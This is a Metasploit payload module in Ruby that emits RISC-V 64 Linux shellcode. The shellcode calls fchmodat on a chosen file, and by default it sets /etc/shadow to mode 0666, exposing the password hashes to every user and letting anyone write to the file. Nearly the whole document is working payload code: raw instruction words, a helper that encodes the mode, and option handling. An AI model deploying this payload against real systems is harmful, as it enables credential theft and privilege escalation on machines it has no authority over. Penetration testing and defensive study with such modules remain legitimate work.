##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 52

  include Msf::Payload::Single

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Chmod',
        'Description' => 'Runs chmod on the specified file with specified mode.',
        'Author' => 'bcoles',
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_RISCV64LE,
        'References' => [
          ['URL', 'https://man7.org/linux/man-pages/man2/fchmodat.2.html'],
          ['URL', 'https://github.com/bcoles/shellcode/blob/main/riscv64/chmod/chmod.s'],
        ]
      )
    )
    register_options([
      OptString.new('FILE', [ true, 'Filename to chmod', '/etc/shadow' ]),
      OptString.new('MODE', [ true, 'File mode (octal)', '0666' ]),
    ])
  end

  # @return [String] the full path of the file to be modified
  def file_path
    datastore['FILE'] || ''
  end

  # @return [Integer] the desired mode for the file
  def mode
    (datastore['MODE'] || '0666').oct
  rescue StandardError => e
    raise ArgumentError, "Invalid chmod mode '#{datastore['MODE']}': #{e.message}"
  end

  # @return [Integer] RISC-V instruction to load mode into a2 register
  # For example: 0x1ad00613 ; li a2,429 ; loads 429 (0o644) into a2
  def chmod_instruction(mode)
    (mode & 0xfff) << 20 | 0x0613
  end

  def generate(_opts = {})
    raise ArgumentError, "chmod mode (#{mode}) is greater than maximum mode size (0x7FF)" if mode > 0x7FF

    shellcode = [
      0xf9c00513,  # li a0,-100
      0x00000597,  # auipc a1,0x0
      0x02458593,  # addi a1,a1,36 # 100a0 <path>
      chmod_instruction(mode), # li a2,<mode>
      0x00000693,  # li a3,0
      0x03500893,  # li a7,53 # __NR_fchmodat
      0x00000073,  # ecall
      0x00000513,  # li a0,0
      0x05d00893,  # li a7,93 # __NR_exit
      0x00000073,  # ecall
    ].pack('V*')
    shellcode += file_path + "\x00"

    # align our shellcode to 4 bytes
    shellcode += "\x00" while shellcode.bytesize % 4 != 0

    super.to_s + shellcode
  end
end
